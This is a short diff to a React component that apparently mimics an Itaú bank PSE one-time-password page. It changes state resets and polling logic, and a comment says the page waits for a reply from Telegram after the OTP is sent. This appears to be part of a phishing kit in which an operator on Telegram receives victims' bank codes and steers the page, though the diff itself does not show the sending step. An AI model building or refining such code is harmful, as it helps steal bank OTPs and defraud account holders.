@@ -199,6 +199,8 @@ const ItauOtpPse = () => {
 
         stopPolling();
         lastEstadoRef.current = null;
+        modalBloqueoEstadoRef.current = null;
+        ignorarEstadoHastaCambioRef.current = null;
         setIsLoading(true);
 
         try {
@@ -265,8 +267,10 @@ const ItauOtpPse = () => {
                 return;
             }
 
-            if (!linkPendiente && lastEstadoRef.current === estado) return;
-            if (!linkPendiente) lastEstadoRef.current = estado;
+            // Si estamos esperando respuesta de Telegram tras enviar OTP y el estado sigue siendo sol_otp o pendiente, continuar esperando
+            if (allowPollNavigationRef.current && (estado === 'sol_otp' || estado === 'pendiente')) {
+                return;
+            }
 
             switch (estado) {
                 case 'sol_otp':
